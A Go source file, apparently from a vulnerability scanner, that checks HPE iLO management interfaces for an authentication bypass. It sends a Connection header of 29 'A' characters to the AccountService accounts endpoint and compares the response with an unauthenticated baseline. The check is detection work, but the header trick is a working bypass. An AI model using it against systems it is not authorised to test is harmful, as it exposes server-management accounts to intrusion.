package ilo

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
)

const bypassPath = "/rest/v1/AccountService/Accounts"

func VerifyAuthBypass(host string, timeout time.Duration) (bool, string, error) {
	client := httpx.ClientWithRedirect(timeout, func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	})
	base := "https://" + netaddr.URLAuthority(host) + bypassPath

	baseStatus, _ := iloGet(client, base, "", timeout)
	if baseStatus == 0 {
		return false, "", nil
	}
	if baseStatus == http.StatusOK {
		return false, "", nil
	}

	status, body := iloGet(client, base, strings.Repeat("A", 29), timeout)
	if status == http.StatusOK && looksLikeILORest(body) {
		return true, fmt.Sprintf(
			"path=%s baselineStatus=%d bypassStatus=%d connectionLen=29 marker=%s bodyBytes=%d",
			bypassPath, baseStatus, status, iloRESTMarker(body), len(body)), nil
	}
	return false, "", nil
}

func iloRESTMarker(body []byte) string {
	s := string(body)
	for _, marker := range []string{"AccountService", "MemberType", "@odata", "links"} {
		if strings.Contains(s, marker) {
			return marker
		}
	}
	return "redfish"
}

func iloGet(client *http.Client, url, connHeader string, timeout time.Duration) (int, []byte) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, nil
	}
	if connHeader != "" {

		req.Header["Connection"] = []string{connHeader}
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	return resp.StatusCode, body
}

func looksLikeILORest(body []byte) bool {
	s := string(body)
	return strings.Contains(s, "AccountService") ||
		strings.Contains(s, "\"MemberType\"") ||
		strings.Contains(s, "@odata") ||
		(strings.Contains(s, "\"links\"") && strings.Contains(s, "\"Oem\""))
}
